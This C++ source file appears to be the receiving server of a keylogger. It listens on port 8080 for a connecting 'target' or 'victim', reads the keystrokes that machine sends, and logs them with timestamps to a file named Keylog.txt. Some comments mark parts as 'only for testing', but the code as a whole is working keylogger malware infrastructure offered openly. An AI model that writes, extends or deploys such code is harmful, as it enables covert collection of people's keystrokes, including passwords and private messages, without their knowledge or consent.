#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <fstream>
#include <ctime>      // for time functions
#include <iomanip> 
using namespace std;
int server_fd, new_socket;
struct sockaddr_in address;
int addrlen = sizeof(address);
char buffer[1024] = {0};
fstream logFile;
bool initiateConnection()
{
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == 0)
    {
        cerr << "Socket creation failed!" << endl;
        return false;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(8080);

    // Bind socket with IP addr
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        cerr << "Bind failed!" << endl;
        return false;
    }

    // Listen target connection
    if (listen(server_fd, 3) < 0)
    {
        cerr << "Listen failed!" << endl;
        return false;
    }

    cout << "Waiting target's connection. . ." << endl;

    // Accept connection
    new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen);
    if (new_socket < 0)
    {
        cerr << "Failed to accept target's connection" << endl;
        return false;
    }
    cout << "Target is connected!" << endl;
    return true;
}
void LOG(string key)
{
    logFile << key;
}
void sendData()
{
    time_t currentTime = std::time(nullptr); 
    tm* localTime = std::localtime(&currentTime);
    // Sử dụng stringstream để format thời gian
    stringstream timeStream;
    timeStream << put_time(localTime, "%Y-%m-%d %H:%M:%S");
    logFile.open("Keylog.txt", fstream::app);
    logFile << '\n' << timeStream.str() <<": ";
    // Loop condition for recieving data until meet '[END]' key (only for testing)
    while (true)
    {
        // Reset buffer
        memset(buffer, 0, sizeof(buffer));

        // Data recieved from victim
        int bytes_received = read(new_socket, buffer, 1024);
        if (bytes_received < 0)
        {
            cerr << endl << "Read target failed!" << endl;
            return;
        }

        // Check if victim is disconnected or not
        if (bytes_received == 0)
        {
            cerr << endl << "Target is disconnected." << endl;
            return;
        }

        // Print buffer
        //buffer[strlen(buffer)] = '\0'; // make sure buffer has 'end' char (is this a bug?)
        cout << buffer << " " << flush;
        LOG(string(buffer));
        // close connection if victim send "END" (only for testing)
        if (strcmp(buffer, "[END]") == 0)
        {
            cerr << endl << "Client sent 'end', closing connection..." << endl;
            return;
        }
    }
}
int main()
{

    if (!initiateConnection())
    {
        return -1;
    }
    sendData();
    cerr << endl << "Exiting keylogger!" << endl;
    // Close connection
    close(new_socket);
    close(server_fd);

    return -1;
}
